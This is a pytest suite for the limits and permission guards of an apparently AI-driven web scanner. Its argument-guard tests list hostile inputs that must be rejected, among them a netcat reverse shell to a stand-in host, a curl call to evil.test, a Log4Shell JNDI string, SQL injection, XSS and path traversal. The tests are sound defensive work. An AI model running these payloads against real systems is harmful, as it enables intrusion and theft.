"""Limits and permissions tests.

These cover the "the AI cannot exceed a budget" and "the AI cannot smuggle in a command"
guarantees.
"""

from __future__ import annotations

import threading
import time

import pytest

from app.models.scan import ScanConfig
from app.policy.limits import Budget, LimitExceeded, LimitTracker, RateLimiter
from app.policy.permissions import (
    ArgumentGuard,
    Capability,
    ConfirmationGate,
    ConfirmationRequest,
    ForbiddenCapability,
    PermissionSet,
    RequestPolicy,
)
from app.tools.catalog import CHECK_HEADERS, BROWSER_OPEN


# --------------------------------------------------------------------------- #
# Budgets
# --------------------------------------------------------------------------- #


def test_budget_reserve_and_exhaust() -> None:
    budget = Budget("test", 2)
    budget.reserve()
    budget.reserve()
    assert budget.exhausted
    assert budget.remaining == 0
    with pytest.raises(LimitExceeded) as excinfo:
        budget.reserve()
    assert excinfo.value.kind == "test"


def test_budget_release_gives_budget_back() -> None:
    budget = Budget("test", 1)
    budget.reserve()
    budget.release()
    assert not budget.exhausted
    budget.reserve()


def test_budget_release_never_goes_negative() -> None:
    budget = Budget("test", 5)
    budget.release(3)
    assert budget.used == 0


def test_budget_rejects_negative_reservation() -> None:
    with pytest.raises(ValueError):
        Budget("test", 5).reserve(-1)


def test_limit_tracker_enforces_every_named_budget() -> None:
    tracker = LimitTracker(
        ScanConfig(max_steps=2, max_tool_calls=3, max_pages=1, max_requests=2, requests_per_second=100.0)
    )
    tracker.reserve("steps")
    tracker.reserve("steps")
    with pytest.raises(LimitExceeded):
        tracker.reserve("steps")

    tracker.reserve("pages")
    with pytest.raises(LimitExceeded):
        tracker.reserve("pages")


def test_unknown_budget_name_raises_key_error() -> None:
    tracker = LimitTracker(ScanConfig())
    with pytest.raises(KeyError):
        tracker.reserve("elephants")


def test_before_request_reserves_and_is_bounded() -> None:
    tracker = LimitTracker(ScanConfig(max_requests=2, requests_per_second=100.0))
    tracker.before_request()
    tracker.before_request()
    with pytest.raises(LimitExceeded) as excinfo:
        tracker.before_request()
    assert excinfo.value.kind == "requests"


def test_scan_deadline_is_enforced() -> None:
    now = [1000.0]
    tracker = LimitTracker(ScanConfig(scan_timeout_s=10.0), clock=lambda: now[0])
    now[0] = 1005.0
    tracker.check_scan_deadline()
    now[0] = 1011.0
    with pytest.raises(LimitExceeded) as excinfo:
        tracker.check_scan_deadline()
    assert excinfo.value.kind == "scan_timeout"


def test_snapshot_reports_usage_and_limits() -> None:
    tracker = LimitTracker(ScanConfig(max_steps=5, max_requests=10, requests_per_second=100.0))
    tracker.reserve("steps")
    tracker.reserve("requests", 3)
    snapshot = tracker.snapshot()
    assert snapshot["steps"] == 1
    assert snapshot["requests"] == 3
    assert snapshot["step_limit"] == 5
    assert snapshot["request_limit"] == 10


# --------------------------------------------------------------------------- #
# Rate limiter
# --------------------------------------------------------------------------- #


def test_rate_limiter_rejects_non_positive_rate() -> None:
    with pytest.raises(ValueError):
        RateLimiter(0)


def test_rate_limiter_allows_a_burst_then_throttles() -> None:
    limiter = RateLimiter(rate_per_second=20.0, burst=2)
    start = time.monotonic()
    limiter.acquire()
    limiter.acquire()
    burst_elapsed = time.monotonic() - start
    assert burst_elapsed < 0.1, "the initial burst should not be delayed"
    limiter.acquire()  # third token must wait
    assert time.monotonic() - start >= 0.03


def test_rate_limiter_reports_wait_time() -> None:
    limiter = RateLimiter(rate_per_second=100.0, burst=1)
    limiter.acquire()
    waited = limiter.acquire()
    assert waited > 0
    assert limiter.total_wait_s >= waited


def test_rate_limiter_is_thread_safe_and_bounded() -> None:
    limiter = RateLimiter(rate_per_second=200.0, burst=1)
    completed: list[int] = []
    lock = threading.Lock()

    def worker(index: int) -> None:
        limiter.acquire()
        with lock:
            completed.append(index)

    threads = [threading.Thread(target=worker, args=(index,)) for index in range(6)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(timeout=5)
    assert len(completed) == 6


# --------------------------------------------------------------------------- #
# Capabilities
# --------------------------------------------------------------------------- #


def test_default_permission_set_grants_http_and_browser_only() -> None:
    permissions = PermissionSet()
    assert permissions.allows(Capability.HTTP_EGRESS)
    assert permissions.allows(Capability.BROWSER)
    assert not permissions.allows(Capability.ACTIVE_SCAN)
    assert not permissions.allows(Capability.PRIVATE_NETWORK)


def test_forbidden_capabilities_never_overlap_granted() -> None:
    permissions = PermissionSet()
    permissions.assert_forbidden_absent()
    granted_values = {capability.value for capability in permissions.granted}
    for forbidden in ForbiddenCapability:
        assert forbidden.value not in granted_values

    # Even a maximally permissive set must not grant a forbidden capability.
    generous = PermissionSet()
    for capability in Capability:
        generous.grant(capability)
    generous.assert_forbidden_absent()
    assert ForbiddenCapability.SHELL.value not in {c.value for c in generous.granted}


def test_check_reports_missing_capability() -> None:
    permissions = PermissionSet()
    assert permissions.check([Capability.HTTP_EGRESS]) is None
    reason = permissions.check([Capability.ACTIVE_SCAN])
    assert reason is not None and "active_scan" in reason


def test_unknown_capability_is_not_allowed() -> None:
    assert PermissionSet().allows("time_travel") is False


# --------------------------------------------------------------------------- #
# Argument guard
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "args",
    [
        {"command": "curl http://evil.test"},
        {"shell": "sh"},
        {"payload": "' OR 1=1--"},
        {"url": "https://example.com/", "exec": "os.system('id')"},
        {"scope": {"allowed_hosts": ["*"]}},
        {"args": {"nested": {"subprocess": "run"}}},
        {"code": "import os"},
        {"allowed_hosts": ["evil.test"]},
        {"permissions": ["shell"]},
    ],
)
def test_forbidden_argument_keys_are_rejected(args: dict) -> None:
    verdict = ArgumentGuard().screen(args)
    assert verdict.allowed is False


def test_nested_forbidden_key_is_found() -> None:
    verdict = ArgumentGuard().screen({"outer": [{"inner": {"command": "id"}}]})
    assert verdict.allowed is False
    assert "command" in verdict.reason


@pytest.mark.parametrize(
    "value",
    [
        "{{7*7}}",
        "${jndi:ldap://evil.test/a}",
        "#{7*7}",
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "../../etc/passwd",
        "' UNION SELECT password FROM users--",
        "1 OR 1=1",
        "a; nc -e /bin/sh evil.test 4444",
        "value | sh",
        "eval(user_input)",
        "line1\x00line2",
        "x" * 5000,
    ],
)
def test_value_tripwires_are_rejected(value: str) -> None:
    verdict = ArgumentGuard().screen({"url": value})
    assert verdict.allowed is False, f"{value!r} was allowed"


@pytest.mark.parametrize(
    "value",
    [
        "https://example.com/search?q=shoes",
        "https://example.com/products/42?ref=nav&page=1",
        "https://example.com/api/v1/users/1/profile?expand=roles",
        "http://127.0.0.1:8000/admin",
    ],
)
def test_ordinary_urls_pass_the_guard(value: str) -> None:
    assert ArgumentGuard().screen({"url": value}).allowed


def test_scalar_arguments_are_allowed() -> None:
    verdict = ArgumentGuard().screen(
        {"url": "https://example.com/", "wait_ms": 500, "screenshot": False, "page_id": None}
    )
    assert verdict.allowed


def test_excessive_nesting_is_rejected() -> None:
    payload: dict = {"a": {}}
    cursor = payload["a"]
    for _ in range(10):
        cursor["a"] = {}
        cursor = cursor["a"]
    assert ArgumentGuard().screen(payload).allowed is False


def test_oversized_list_is_rejected() -> None:
    assert ArgumentGuard().screen({"urls": [f"https://example.com/{i}" for i in range(200)]}).allowed is False


def test_unsupported_value_type_is_rejected() -> None:
    assert ArgumentGuard().screen({"url": object()}).allowed is False


# --------------------------------------------------------------------------- #
# Request policy
# --------------------------------------------------------------------------- #


def test_request_policy_allows_a_legitimate_discovery_call() -> None:
    outcome = RequestPolicy().preflight(BROWSER_OPEN.meta, {"url": "https://example.com/"})
    assert outcome.allowed
    assert outcome.stage == ""


def test_request_policy_denies_at_the_permissions_stage() -> None:
    permissions = PermissionSet()
    permissions.revoke(Capability.BROWSER)
    outcome = RequestPolicy(permissions).preflight(BROWSER_OPEN.meta, {"url": "https://example.com/"})
    assert outcome.allowed is False
    assert outcome.stage == "permissions"


def test_request_policy_denies_at_the_arguments_stage() -> None:
    outcome = RequestPolicy().preflight(
        CHECK_HEADERS.meta, {"url": "https://example.com/", "command": "id"}
    )
    assert outcome.allowed is False
    assert outcome.stage == "arguments"


# --------------------------------------------------------------------------- #
# Confirmation gate
# --------------------------------------------------------------------------- #


def _request() -> ConfirmationRequest:
    return ConfirmationRequest(tool=BROWSER_OPEN.meta, args={"url": "https://example.com/"}, reason="test")


def test_confirmation_gate_auto_approve() -> None:
    gate = ConfirmationGate(auto_approve=True)
    approved, reason = gate.request(_request())
    assert approved and "auto" in reason
    assert gate.audit[0]["approved"] is True


def test_confirmation_gate_non_interactive_denies() -> None:
    gate = ConfirmationGate(interactive=False)
    approved, reason = gate.request(_request())
    assert approved is False
    assert "non-interactive" in reason


def test_confirmation_gate_uses_custom_confirmer() -> None:
    gate = ConfirmationGate(confirmer=lambda request: False)
    approved, _ = gate.request(_request())
    assert approved is False
    assert gate.audit[0]["approved"] is False


def test_confirmation_audit_records_every_decision() -> None:
    gate = ConfirmationGate(confirmer=lambda request: True)
    gate.request(_request())
    gate.request(_request())
    assert len(gate.audit) == 2
    assert all(entry["tool"] == "browser_open" for entry in gate.audit)
